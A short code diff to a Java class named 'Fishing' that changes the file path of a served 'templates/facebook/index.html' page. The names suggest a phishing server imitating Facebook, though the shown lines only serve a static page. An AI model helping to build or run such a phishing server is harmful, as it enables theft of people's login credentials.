@@ -18,7 +18,7 @@ public class Fishing {
 
         // Serve index.html
         server.createContext("/", exchange -> {
-            byte[] response = Files.readAllBytes(Paths.get("templates/facebook/index.html"));
+            byte[] response = Files.readAllBytes(Paths.get("src/main/resources/templates/facebook/index.html"));
             exchange.getResponseHeaders().add("Content-Type", "text/html");
             exchange.sendResponseHeaders(200, response.length);
             OutputStream os = exchange.getResponseBody();
